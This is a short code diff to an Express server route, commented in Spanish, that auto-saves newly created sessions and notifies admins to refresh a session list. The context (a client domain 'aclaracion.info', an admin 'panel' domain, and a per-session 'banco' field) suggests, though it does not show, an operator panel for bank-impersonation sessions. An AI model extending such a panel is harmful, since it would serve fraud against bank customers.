@@ -602,6 +602,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
       });
 
+      // Guardar la sesión automáticamente para que aparezca en el historial
+      await storage.saveSession(sessionId);
+      console.log(`Sesión guardada automáticamente: ${sessionId}`);
+
       // Configuración de dominios
       const clientDomain = process.env.CLIENT_DOMAIN || 'aclaracion.info';
       const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaracion.info';
@@ -624,6 +628,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
           banco: banco as string,
           userName: user.username
         }
+      }));
+
+      // Enviar también un mensaje de actualización de sesiones para refrescar la lista
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSIONS_UPDATED'
       }));
 
       res.json({ 
